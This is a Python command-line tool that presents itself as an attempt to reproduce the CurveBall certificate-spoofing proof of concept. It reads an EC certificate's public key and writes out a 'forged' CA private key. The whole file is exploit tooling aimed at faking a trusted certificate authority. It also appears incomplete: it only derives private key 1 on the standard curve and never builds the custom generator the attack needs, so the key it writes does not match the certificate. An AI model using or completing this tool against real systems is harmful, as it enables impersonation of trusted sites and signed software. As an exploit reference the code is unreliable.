# pylint: disable=line-too-long,no-value-for-parameter,fixme
"""
gen_key2 module is an attempt a reproducing the https://github.com/ollypwn/CurveBall
ruby PoC in python as a CLI
"""

import click

from cryptography import x509
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends.openssl.ec import _EllipticCurvePublicKey
from cryptography.hazmat.primitives.asymmetric.ec import derive_private_key
from cryptography.hazmat.primitives.serialization import Encoding
from cryptography.hazmat.primitives.serialization import PublicFormat


def pub_key(path: str) -> _EllipticCurvePublicKey:
    """
    given a path to a valid EC certificate return the public key
    """
    with open(path, "rb") as handle:
        raw_cert = handle.read()
    cert = x509.load_pem_x509_certificate(raw_cert, default_backend())
    return cert.public_key()


def forge(path: str):
    """
    given a path to a EC certificate forge a new key
    """
    public_key = pub_key(path)
    # TODO: Remove prints
    print("Found public key")
    print(public_key.public_bytes(Encoding.PEM, PublicFormat.SubjectPublicKeyInfo))

    curve = public_key.curve
    private_value = 1
    private_key = derive_private_key(private_value, curve, default_backend())

    pem = private_key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.TraditionalOpenSSL,
        encryption_algorithm=serialization.NoEncryption(),
    )
    # TODO: Remove prints
    print("PEM:")
    print(pem)
    return pem


@click.command()
@click.option("-p", "--path", default=None, help="Full path to EC certificate")
@click.option("-o", "--output", default="spoofed_ca.key", help="Full output path to write forged certificate to")
@click.option("-d", "--debug", is_flag=True, default=False, help="Debug does not write keys to dick")
def cli(path: str, output: str, debug: bool):
    """Create forged key from EC certificate"""
    pem = forge(path)
    if debug:
        return
    with open(output, "wb") as handle:
        handle.write(pem)


if __name__ == "__main__":
    cli()
